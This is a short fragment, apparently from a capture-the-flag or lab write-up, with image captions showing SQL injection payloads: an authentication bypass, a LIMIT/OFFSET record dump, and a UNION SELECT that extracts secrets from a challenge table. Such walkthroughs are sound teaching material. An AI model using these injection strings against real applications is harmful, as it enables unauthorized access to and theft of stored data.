...
![Image of Login page with `' OR 1=1 --`]()
...
![Image of Searching name with `' OR 1=1 LIMIT 4 OFFSET 10 --`]()
...
![Image of `' UNION SELECT secrets, NULL, NULL, NULL from CITADEL_ARCHIVE_2077`]()
